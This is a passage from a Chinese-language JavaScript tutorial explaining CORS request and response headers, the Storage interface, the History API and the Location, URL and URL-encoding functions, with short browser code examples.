    > User-Agent: Mozilla/5.0...
    > ```
    >
    > 上面的头信息中，`Origin`字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。
    >
    > 如果`Origin`指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含`Access-Control-Allow-Origin`字段（详见下文），就知道出错了，从而抛出一个错误，被`XMLHttpRequest`的`onerror`回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。
    >
    > 如果`Origin`指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。
    >
    > ```
    > Access-Control-Allow-Origin: http://api.bob.com
    > Access-Control-Allow-Credentials: true
    > Access-Control-Expose-Headers: FooBar
    > Content-Type: text/html; charset=utf-8
    > ```
    >
    > 上面的头信息之中，有三个与 CORS 请求相关的字段，都以`Access-Control-`开头。
    >
    > **（1）`Access-Control-Allow-Origin`**
    >
    > 该字段是必须的。它的值要么是请求时`Origin`字段的值，要么是一个`*`，表示接受任意域名的请求。
    >
    > **（2）`Access-Control-Allow-Credentials`**
    >
    > 该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为`true`，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为`true`，如果服务器不要浏览器发送 Cookie，不发送该字段即可。
    >
    > **（3）`Access-Control-Expose-Headers`**
    >
    > 该字段可选。CORS 请求时，`XMLHttpRequest`对象的`getResponseHeader()`方法只能拿到6个服务器返回的基本字段：`Cache-Control`、`Content-Language`、`Content-Type`、`Expires`、`Last-Modified`、`Pragma`。如果想拿到其他字段，就必须在`Access-Control-Expose-Headers`里面指定。上面的例子指定，`getResponseHeader('FooBar')`可以返回`FooBar`字段的值。
    >
    > ### withCredentials 属性
    >
    > 上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定`Access-Control-Allow-Credentials`字段，告诉浏览器可以发送 Cookie。
    >
    > ```
    > Access-Control-Allow-Credentials: true
    > ```
    >
    > 同时，开发者必须在 AJAX 请求中打开`withCredentials`属性。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.withCredentials = true;
    > ```
    >
    > 否则，即使服务器要求发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。
    >
    > 但是，有的浏览器默认将`withCredentials`属性设为`true`。这导致如果省略`withCredentials`设置，这些浏览器可能还是会一起发送 Cookie。这时，可以显式关闭`withCredentials`。
    >
    > ```
    > xhr.withCredentials = false;
    > ```
    >
    > 需要注意的是，如果服务器要求浏览器发送 Cookie，`Access-Control-Allow-Origin`就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的`document.cookie`也无法读取服务器域名下的 Cookie。
    >
    > ## 非简单请求
    >
    > ### 预检请求
    >
    > 非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是`PUT`或`DELETE`，或者`Content-Type`字段的类型是`application/json`。
    >
    > 非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 方法和头信息字段。只有得到肯定答复，浏览器才会发出正式的`XMLHttpRequest`请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器收到大量`DELETE`和`PUT`请求，这些传统的表单不可能跨源发出的请求。
    >
    > 下面是一段浏览器的 JS 脚本。
    >
    > ```
    > var url = 'http://api.alice.com/cors';
    > var xhr = new XMLHttpRequest();
    > xhr.open('PUT', url, true);
    > xhr.setRequestHeader('X-Custom-Header', 'value');
    > xhr.send();
    > ```
    >
    > 上面代码中，HTTP 请求的方法是`PUT`，并且发送一个自定义头信息`X-Custom-Header`。
    >
    > 浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。
    >
    > ```
    > OPTIONS /cors HTTP/1.1
    > Origin: http://api.bob.com
    > Access-Control-Request-Method: PUT
    > Access-Control-Request-Headers: X-Custom-Header
    > Host: api.alice.com
    > Accept-Language: en-US
    > Connection: keep-alive
    > User-Agent: Mozilla/5.0...
    > ```
    >
    > “预检”请求用的请求方法是`OPTIONS`，表示这个请求是用来询问的。头信息里面，关键字段是`Origin`，表示请求来自哪个源。
    >
    > 除了`Origin`字段，“预检”请求的头信息包括两个特殊字段。
    >
    > **（1）`Access-Control-Request-Method`**
    >
    > 该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是`PUT`。
    >
    > **（2）`Access-Control-Request-Headers`**
    >
    > 该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是`X-Custom-Header`。
    >
    > ### 预检请求的回应
    >
    > 服务器收到“预检”请求以后，检查了`Origin`、`Access-Control-Request-Method`和`Access-Control-Request-Headers`字段以后，确认允许跨源请求，就可以做出回应。
    >
    > ```
    > HTTP/1.1 200 OK
    > Date: Mon, 01 Dec 2008 01:15:39 GMT
    > Server: Apache/2.0.61 (Unix)
    > Access-Control-Allow-Origin: http://api.bob.com
    > Access-Control-Allow-Methods: GET, POST, PUT
    > Access-Control-Allow-Headers: X-Custom-Header
    > Content-Type: text/html; charset=utf-8
    > Content-Encoding: gzip
    > Content-Length: 0
    > Keep-Alive: timeout=2, max=100
    > Connection: Keep-Alive
    > ```
    >
    > 上面的 HTTP 回应中，关键的是`Access-Control-Allow-Origin`字段，表示`http://api.bob.com`可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。
    >
    > ```
    > Access-Control-Allow-Origin: *
    > ```
    >
    > 如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。
    >
    > ```
    > OPTIONS http://api.bob.com HTTP/1.1
    > Status: 200
    > Access-Control-Allow-Origin: https://notyourdomain.com
    > Access-Control-Allow-Method: POST
    > ```
    >
    > 上面的服务器回应，`Access-Control-Allow-Origin`字段明确不包括发出请求的`http://api.bob.com`。
    >
    > 这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被`XMLHttpRequest`对象的`onerror`回调函数捕获。控制台会打印出如下的报错信息。
    >
    > ```
    > XMLHttpRequest cannot load http://api.alice.com.
    > Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
    > ```
    >
    > 服务器回应的其他 CORS 相关字段如下。
    >
    > ```
    > Access-Control-Allow-Methods: GET, POST, PUT
    > Access-Control-Allow-Headers: X-Custom-Header
    > Access-Control-Allow-Credentials: true
    > Access-Control-Max-Age: 1728000
    > ```
    >
    > **（1）`Access-Control-Allow-Methods`**
    >
    > 该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨源请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。
    >
    > **（2）`Access-Control-Allow-Headers`**
    >
    > 如果浏览器请求包括`Access-Control-Request-Headers`字段，则`Access-Control-Allow-Headers`字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。
    >
    > **（3）`Access-Control-Allow-Credentials`**
    >
    > 该字段与简单请求时的含义相同。
    >
    > **（4）`Access-Control-Max-Age`**
    >
    > 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。
    >
    > ### 浏览器的正常请求和回应
    >
    > 一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个`Origin`头信息字段。服务器的回应，也都会有一个`Access-Control-Allow-Origin`头信息字段。
    >
    > 下面是“预检”请求之后，浏览器的正常 CORS 请求。
    >
    > ```
    > PUT /cors HTTP/1.1
    > Origin: http://api.bob.com
    > Host: api.alice.com
    > X-Custom-Header: value
    > Accept-Language: en-US
    > Connection: keep-alive
    > User-Agent: Mozilla/5.0...
    > ```
    >
    > 上面头信息的`Origin`字段是浏览器自动添加的。
    >
    > 下面是服务器正常的回应。
    >
    > ```
    > Access-Control-Allow-Origin: http://api.bob.com
    > Content-Type: text/html; charset=utf-8
    > ```
    >
    > 上面头信息中，`Access-Control-Allow-Origin`字段是每次回应都必定包含的。
    >
    > ## 与 JSONP 的比较
    >
    > CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持`GET`请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。

  - Storage 接口

    > ## 概述
    >
    > Storage 接口用于脚本在浏览器保存数据。两个对象部署了这个接口：`window.sessionStorage`和`window.localStorage`。
    >
    > `sessionStorage`保存的数据用于浏览器的一次会话（session），当会话结束（通常是窗口关闭），数据被清空；`localStorage`保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的其他方面都一致。
    >
    > 保存的数据都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。
    >
    > 这个接口很像 Cookie 的强化版，能够使用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，Firefox 中，`a.example.com`和`b.example.com`共享 5MB 的存储空间。另外，与 Cookie 一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取，如果跨域操作会报错。
    >
    > ## 属性和方法
    >
    > Storage 接口只有一个属性。
    >
    > - `Storage.length`：返回保存的数据项个数。
    >
    > ```
    > window.localStorage.setItem('foo', 'a');
    > window.localStorage.setItem('bar', 'b');
    > window.localStorage.setItem('baz', 'c');
    > 
    > window.localStorage.length // 3
    > ```
    >
    > 该接口提供5个方法。
    >
    > ### Storage.setItem()
    >
    > `Storage.setItem()`方法用于存入数据。它接受两个参数，第一个是键名，第二个是保存的数据。如果键名已经存在，该方法会更新已有的键值。该方法没有返回值。
    >
    > ```
    > window.sessionStorage.setItem('key', 'value');
    > window.localStorage.setItem('key', 'value');
    > ```
    >
    > 注意，`Storage.setItem()`两个参数都是字符串。如果不是字符串，会自动转成字符串，再存入浏览器。
    >
    > ```
    > window.sessionStorage.setItem(3, { foo: 1 });
    > window.sessionStorage.getItem('3') // "[object Object]"
    > ```
    >
    > 上面代码中，`setItem`方法的两个参数都不是字符串，但是存入的值都是字符串。
    >
    > 如果储存空间已满，该方法会抛错。
    >
    > 写入不一定要用这个方法，直接赋值也是可以的。
    >
    > ```
    > // 下面三种写法等价
    > window.localStorage.foo = '123';
    > window.localStorage['foo'] = '123';
    > window.localStorage.setItem('foo', '123');
    > ```
    >
    > ### Storage.getItem()
    >
    > `Storage.getItem()`方法用于读取数据。它只有一个参数，就是键名。如果键名不存在，该方法返回`null`。
    >
    > ```
    > window.sessionStorage.getItem('key')
    > window.localStorage.getItem('key')
    > ```
    >
    > 键名应该是一个字符串，否则会被自动转为字符串。
    >
    > ### Storage.removeItem()
    >
    > `Storage.removeItem()`方法用于清除某个键名对应的键值。它接受键名作为参数，如果键名不存在，该方法不会做任何事情。
    >
    > ```
    > sessionStorage.removeItem('key');
    > localStorage.removeItem('key');
    > ```
    >
    > ### Storage.clear()
    >
    > `Storage.clear()`方法用于清除所有保存的数据。该方法的返回值是`undefined`。
    >
    > ```
    > window.sessionStorage.clear()
    > window.localStorage.clear()
    > ```
    >
    > ### Storage.key()
    >
    > `Storage.key()`方法接受一个整数作为参数（从零开始），返回该位置对应的键名。
    >
    > ```
    > window.sessionStorage.setItem('key', 'value');
    > window.sessionStorage.key(0) // "key"
    > ```
    >
    > 结合使用`Storage.length`属性和`Storage.key()`方法，可以遍历所有的键。
    >
    > ```
    > for (var i = 0; i < window.localStorage.length; i++) {
    >   console.log(localStorage.key(i));
    > }
    > ```
    >
    > ## storage 事件
    >
    > Storage 接口储存的数据发生变化时，会触发 storage 事件，可以指定这个事件的监听函数。
    >
    > ```
    > window.addEventListener('storage', onStorageChange);
    > ```
    >
    > 监听函数接受一个`event`实例对象作为参数。这个实例对象继承了 StorageEvent 接口，有几个特有的属性，都是只读属性。
    >
    > - `StorageEvent.key`：字符串，表示发生变动的键名。如果 storage 事件是由`clear()`方法引起，该属性返回`null`。
    > - `StorageEvent.newValue`：字符串，表示新的键值。如果 storage 事件是由`clear()`方法或删除该键值对引发的，该属性返回`null`。
    > - `StorageEvent.oldValue`：字符串，表示旧的键值。如果该键值对是新增的，该属性返回`null`。
    > - `StorageEvent.storageArea`：对象，返回键值对所在的整个对象。也说是说，可以从这个属性上面拿到当前域名储存的所有键值对。
    > - `StorageEvent.url`：字符串，表示原始触发 storage 事件的那个网页的网址。
    >
    > 下面是`StorageEvent.key`属性的例子。
    >
    > ```
    > function onStorageChange(e) {
    >   console.log(e.key);
    > }
    > 
    > window.addEventListener('storage', onStorageChange);
    > ```
    >
    > 注意，该事件有一个很特别的地方，就是它不在导致数据变化的当前页面触发，而是在同一个域名的其他窗口触发。也就是说，如果浏览器只打开一个窗口，可能观察不到这个事件。比如同时打开多个窗口，当其中的一个窗口导致储存的数据发生改变时，只有在其他窗口才能观察到监听函数的执行。可以通过这种机制，实现多个窗口之间的通信。

  - History 对象

    > ## 概述
    >
    > `window.history`属性指向 History 对象，它表示当前窗口的浏览历史。
    >
    > History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。
    >
    > ```
    > window.history.length // 3
    > ```
    >
    > 由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。
    >
    > ```
    > // 后退到前一个网址
    > history.back()
    > 
    > // 等同于
    > history.go(-1)
    > ```
    >
    > 浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。
    >
    > ## 属性
    >
    > History 对象主要有两个属性。
    >
    > - `History.length`：当前窗口访问过的网址数量（包括当前网页）
    > - `History.state`：History 堆栈最上层的状态值（详见下文）
    >
    > ```
    > // 当前窗口访问过多少个网页
    > window.history.length // 1
    > 
    > // History 对象的当前状态
    > // 通常是 undefined，即未设置
    > window.history.state // undefined
    > ```
    >
    > ## 方法
    >
    > ### History.back()、History.forward()、History.go()
    >
    > 这三个方法用于在历史之中移动。
    >
    > - `History.back()`：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。
    > - `History.forward()`：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。
    > - `History.go()`：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如`go(1)`相当于`forward()`，`go(-1)`相当于`back()`。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为`0`，相当于刷新当前页面。
    >
    > ```
    > history.back();
    > history.forward();
    > history.go(-2);
    > ```
    >
    > `history.go(0)`相当于刷新当前页面。
    >
    > ```
    > history.go(0); // 刷新当前页面
    > ```
    >
    > 注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。
    >
    > ### History.pushState()
    >
    > `History.pushState()`方法用于在历史中添加一条记录。
    >
    > ```
    > window.history.pushState(state, title, url)
    > ```
    >
    > 该方法接受三个参数，依次为：
    >
    > - `state`：一个与添加的记录相关联的状态对象，主要用于`popstate`事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填`null`。
    > - `title`：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。
    > - `url`：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。
    >
    > 假定当前网址是`example.com/1.html`，使用`pushState()`方法在浏览记录（History 对象）中添加一个新记录。
    >
    > ```
    > var stateObj = { foo: 'bar' };
    > history.pushState(stateObj, 'page 2', '2.html');
    > ```
    >
    > 添加新记录后，浏览器地址栏立刻显示`example.com/2.html`，但并不会跳转到`2.html`，甚至也不会检查`2.html`是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问`google.com`)，然后点击了倒退按钮，页面的 URL 将显示`2.html`；你再点击一次倒退按钮，URL 将显示`1.html`。
    >
    > 总之，`pushState()`方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。
    >
    > 使用该方法之后，就可以用`History.state`属性读出状态对象。
    >
    > ```
    > var stateObj = { foo: 'bar' };
    > history.pushState(stateObj, 'page 2', '2.html');
    > history.state // {foo: "bar"}
    > ```
    >
    > 如果`pushState`的 URL 参数设置了一个新的锚点值（即`hash`），并不会触发`hashchange`事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。
    >
    > 如果`pushState()`方法设置了一个跨域网址，则会报错。
    >
    > ```
    > // 报错
    > // 当前网址为 http://example.com
    > history.pushState(null, '', 'https://twitter.com/hello');
    > ```
    >
    > 上面代码中，`pushState`想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。
    >
    > ### History.replaceState()
    >
    > `History.replaceState()`方法用来修改 History 对象的当前记录，其他都与`pushState()`方法一模一样。
    >
    > 假定当前网页是`example.com/example.html`。
    >
    > ```
    > history.pushState({page: 1}, 'title 1', '?page=1')
    > // URL 显示为 http://example.com/example.html?page=1
    > 
    > history.pushState({page: 2}, 'title 2', '?page=2');
    > // URL 显示为 http://example.com/example.html?page=2
    > 
    > history.replaceState({page: 3}, 'title 3', '?page=3');
    > // URL 显示为 http://example.com/example.html?page=3
    > 
    > history.back()
    > // URL 显示为 http://example.com/example.html?page=1
    > 
    > history.back()
    > // URL 显示为 http://example.com/example.html
    > 
    > history.go(2)
    > // URL 显示为 http://example.com/example.html?page=3
    > ```
    >
    > ## popstate 事件
    >
    > 每当同一个文档的浏览历史（即`history`对象）出现变化时，就会触发`popstate`事件。
    >
    > 注意，仅仅调用`pushState()`方法或`replaceState()`方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JS 调用`History.back()`、`History.forward()`、`History.go()`方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。
    >
    > 使用的时候，可以为`popstate`事件指定回调函数。
    >
    > ```
    > window.onpopstate = function (event) {
    >   console.log('location: ' + document.location);
    >   console.log('state: ' + JSON.stringify(event.state));
    > };
    > 
    > // 或者
    > window.addEventListener('popstate', function(event) {
    >   console.log('location: ' + document.location);
    >   console.log('state: ' + JSON.stringify(event.state));
    > });
    > ```
    >
    > 回调函数的参数是一个`event`事件对象，它的`state`属性指向`pushState`和`replaceState`方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的`event.state`，就是通过`pushState`和`replaceState`方法，为当前 URL 绑定的`state`对象。
    >
    > 这个`state`对象也可以直接通过`history`对象读取。
    >
    > ```
    > var currentState = history.state;
    > ```
    >
    > 注意，页面第一次加载的时候，浏览器不会触发`popstate`事件。

  - Location 对象，URL 对象，URLSearchParams 对象

    > URL 是互联网的基础设施之一。浏览器提供了一些原生对象，用来管理 URL。
    >
    > ## Location 对象
    >
    > `Location`对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过`window.location`和`document.location`属性，可以拿到这个对象。
    >
    > ### 属性
    >
    > `Location`对象提供以下属性。
    >
    > - `Location.href`：整个 URL。
    > - `Location.protocol`：当前 URL 的协议，包括冒号（`:`）。
    > - `Location.host`：主机。如果端口不是协议默认的`80`和`433`，则还会包括冒号（`:`）和端口。
    > - `Location.hostname`：主机名，不包括端口。
    > - `Location.port`：端口号。
    > - `Location.pathname`：URL 的路径部分，从根路径`/`开始。
    > - `Location.search`：查询字符串部分，从问号`?`开始。
    > - `Location.hash`：片段字符串部分，从`#`开始。
    > - `Location.username`：域名前面的用户名。
    > - `Location.password`：域名前面的密码。
    > - `Location.origin`：URL 的协议、主机名和端口。
    >
    > ```
    > // 当前网址为
    > // http://user:passwd@www.example.com:4097/path/a.html?x=111#part1
    > document.location.href
    > // "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"
    > document.location.protocol
    > // "http:"
    > document.location.host
    > // "www.example.com:4097"
    > document.location.hostname
    > // "www.example.com"
    > document.location.port
    > // "4097"
    > document.location.pathname
    > // "/path/a.html"
    > document.location.search
    > // "?x=111"
    > document.location.hash
    > // "#part1"
    > document.location.username
    > // "user"
    > document.location.password
    > // "passwd"
    > document.location.origin
    > // "http://user:passwd@www.example.com:4097"
    > ```
    >
    > 这些属性里面，只有`origin`属性是只读的，其他属性都可写。
    >
    > 注意，如果对`Location.href`写入新的 URL 地址，浏览器会立刻跳转到这个新地址。
    >
    > ```
    > // 跳转到新网址
    > document.location.href = 'http://www.example.com';
    > ```
    >
    > 这个特性常常用于让网页自动滚动到新的锚点。
    >
    > ```
    > document.location.href = '#top';
    > // 等同于
    > document.location.hash = '#top';
    > ```
    >
    > 直接改写`location`，相当于写入`href`属性。
    >
    > ```
    > document.location = 'http://www.example.com';
    > // 等同于
    > document.location.href = 'http://www.example.com';
    > ```
    >
    > 另外，`Location.href`属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的`Location.href`属性，导致后者的网址跳转。`Location`的其他属性都不允许跨域写入。
    >
    > ### 方法
    >
    > **（1）Location.assign()**
    >
    > `assign`方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。
    >
    > ```
    > // 跳转到新的网址
    > document.location.assign('http://www.example.com')
    > ```
    >
    > **（2）Location.replace()**
    >
    > `replace`方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。
    >
    > 它与`assign`方法的差异在于，`replace`会在浏览器的浏览历史`History`里面删除当前网址，也就是说，一旦使用了该方法，后退按钮就无法回到当前网页了，相当于在浏览历史里面，使用新的 URL 替换了老的 URL。它的一个应用是，当脚本发现当前是移动设备时，就立刻跳转到移动版网页。
    >
    > ```
    > // 跳转到新的网址
    > document.location.replace('http://www.example.com')
    > ```
    >
    > **（3）Location.reload()**
    >
    > `reload`方法使得浏览器重新加载当前网址，相当于按下浏览器的刷新按钮。
    >
    > 它接受一个布尔值作为参数。如果参数为`true`，浏览器将向服务器重新请求这个网页，并且重新加载后，网页将滚动到头部（即`scrollTop === 0`）。如果参数是`false`或为空，浏览器将从本地缓存重新加载该网页，并且重新加载后，网页的视口位置是重新加载前的位置。
    >
    > ```
    > // 向服务器重新请求当前网址
    > window.location.reload(true);
    > ```
    >
    > **（4）Location.toString()**
    >
    > `toString`方法返回整个 URL 字符串，相当于读取`Location.href`属性。
    >
    > ## URL 的编码和解码
    >
    > 网页的 URL 只能包含合法的字符。合法字符分成两类。
    >
    > - URL 元字符：分号（`;`），逗号（`,`），斜杠（`/`），问号（`?`），冒号（`:`），at（`@`），`&`，等号（`=`），加号（`+`），美元符号（`$`），井号（`#`）
    > - 语义字符：`a-z`，`A-Z`，`0-9`，连词号（`-`），下划线（`_`），点（`.`），感叹号（`!`），波浪线（`~`），星号（`*`），单引号（`'`），圆括号（`()`）
    >
    > 除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（`%`）加上两个大写的十六进制字母。
    >
    > 比如，UTF-8 的操作系统上，`http://www.example.com/q=春节`这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成`http://www.example.com/q=%E6%98%A5%E8%8A%82`。其中，“春”转成了`%E6%98%A5`，“节”转成了`%E8%8A%82`。这是因为“春”和“节”的 UTF-8 编码分别是`E6 98 A5`和`E8 8A 82`，将每个字节前面加上百分号，就构成了 URL 编码。
    >
    > JS 提供四个 URL 的编码/解码方法。
    >
    > - `encodeURI()`
    > - `encodeURIComponent()`
    > - `decodeURI()`
    > - `decodeURIComponent()`
    >
    > ### encodeURI()
    >
    > `encodeURI()`方法用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。
    >
    > ```
    > encodeURI('http://www.example.com/q=春节')
    > // "http://www.example.com/q=%E6%98%A5%E8%8A%82"
    > ```
    >
    > ### encodeURIComponent()
    >
    > `encodeURIComponent()`方法用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。
    >
    > ```
    > encodeURIComponent('春节')
    > // "%E6%98%A5%E8%8A%82"
    > encodeURIComponent('http://www.example.com/q=春节')
    > // "http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82"
    > ```
    >
    > 上面代码中，`encodeURIComponent()`会连 URL 元字符一起转义，所以如果转码整个 URL 就会出错。
    >
    > ### decodeURI()
    >
    > `decodeURI()`方法用于整个 URL 的解码。它是`encodeURI()`方法的逆运算。它接受一个参数，就是转码后的 URL。
    >
    > ```
    > decodeURI('http://www.example.com/q=%E6%98%A5%E8%8A%82')
    > // "http://www.example.com/q=春节"
    > ```
    >
    > ### decodeURIComponent()
    >
    > `decodeURIComponent()`用于URL 片段的解码。它是`encodeURIComponent()`方法的逆运算。它接受一个参数，就是转码后的 URL 片段。
    >
    > ```
    > decodeURIComponent('%E6%98%A5%E8%8A%82')
    > // "春节"
    > ```
    >
    > ## URL 接口
    >
    > 浏览器原生提供`URL()`接口，它是一个构造函数，用来构造、解析和编码 URL。一般情况下，通过`window.URL`可以拿到这个构造函数。
    >
    > ### 构造函数
    >
    > `URL()`作为构造函数，可以生成 URL 实例。它接受一个表示 URL 的字符串作为参数。如果参数不是合法的 URL，会报错。
    >
    > ```
    > var url = new URL('http://www.example.com/index.html');
    > url.href
    > // "http://www.example.com/index.html"
    > ```
    >
    > 上面示例生成了一个 URL 实例，用来代表指定的网址。
    >
    > 除了字符串，`URL()`的参数也可以是另一个 URL 实例。这时，`URL()`会自动读取该实例的`href`属性，作为实际参数。
    >
    > 如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。
    >
    > ```
    > var url1 = new URL('index.html', 'http://example.com');
    > url1.href
    > // "http://example.com/index.html"
    > 
    > var url2 = new URL('page2.html', 'http://example.com/page1.html');
    > url2.href
    > // "http://example.com/page2.html"
    > 
    > var url3 = new URL('..', 'http://example.com/a/b.html')
    > url3.href
    > // "http://example.com/"
    > ```
    >
    > 上面代码中，返回的 URL 实例的路径都是在第二个参数的基础上，切换到第一个参数得到的。最后一个例子里面，第一个参数是`..`，表示上层路径。
    >
    > ### 实例属性
    >
    > URL 实例的属性与`Location`对象的属性基本一致，返回当前 URL 的信息。
    >
    > - URL.href：返回整个 URL
    > - URL.protocol：返回协议，以冒号`:`结尾
    > - URL.hostname：返回域名
    > - URL.host：返回域名与端口，包含`:`号，默认的80和443端口会省略
    > - URL.port：返回端口
    > - URL.origin：返回协议、域名和端口
    > - URL.pathname：返回路径，以斜杠`/`开头
    > - URL.search：返回查询字符串，以问号`?`开头
    > - URL.searchParams：返回一个`URLSearchParams`实例，该属性是`Location`对象没有的
    > - URL.hash：返回片段识别符，以井号`#`开头
    > - URL.password：返回域名前面的密码
    > - URL.username：返回域名前面的用户名
    >
    > ```
    > var url = new URL('http://user:passwd@www.example.com:4097/path/a.html?x=111#part1');
    > 
    > url.href
    > // "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"
    > url.protocol
    > // "http:"
    > url.hostname
    > // "www.example.com"
    > url.host
    > // "www.example.com:4097"
    > url.port
    > // "4097"
    > url.origin
    > // "http://www.example.com:4097"
    > url.pathname
    > // "/path/a.html"
    > url.search
    > // "?x=111"
    > url.searchParams
    > // URLSearchParams {}
    > url.hash
    > // "#part1"
    > url.password
    > // "passwd"
    > url.username
    > // "user"
    > ```
    >
    > 这些属性里面，只有`origin`属性是只读的，其他属性都可写，并且会立即生效。
    >
    > ```
    > var url = new URL('http://example.com/index.html#part1');
    > 
    > url.pathname = 'index2.html';
    > url.href // "http://example.com/index2.html#part1"
    > 
    > url.hash = '#part2';
    > url.href // "http://example.com/index2.html#part2"
    > ```
    >
    > 上面代码中，改变 URL 实例的`pathname`属性和`hash`属性，都会实时反映在 URL 实例当中。
    >
    > ### 静态方法
    >
    > **（1）URL.createObjectURL()**
    >
    > `URL.createObjectURL()`方法用来为上传/下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了`File`对象或`Blob`对象的 URL。
    >
    > ```
    > // HTML 代码如下
    > // <div id="display"/>
    > // <input
    > //   type="file"
    > //   id="fileElem"
    > //   multiple
    > //   accept="image/*"
    > //   onchange="handleFiles(this.files)"
    > //  >
    > var div = document.getElementById('display');
    > 
    > function handleFiles(files) {
    >   for (var i = 0; i < files.length; i++) {
    >     var img = document.createElement('img');
    >     img.src = window.URL.createObjectURL(files[i]);
    >     div.appendChild(img);
    >   }
    > }
    > ```
    >
    > 上面代码中，`URL.createObjectURL()`方法用来为上传的文件生成一个 URL 字符串，作为`<img>`元素的图片来源。
    >
    > 该方法生成的 URL 就像下面的样子。
    >
    > ```
    > blob:http://localhost/c745ef73-ece9-46da-8f66-ebes574789b1
    > ```
    >
    > 注意，每次使用`URL.createObjectURL()`方法，都会在内存里面生成一个 URL 实例。如果不再需要该方法生成的 URL 字符串，为了节省内存，可以使用`URL.revokeObjectURL()`方法释放这个实例。
    >
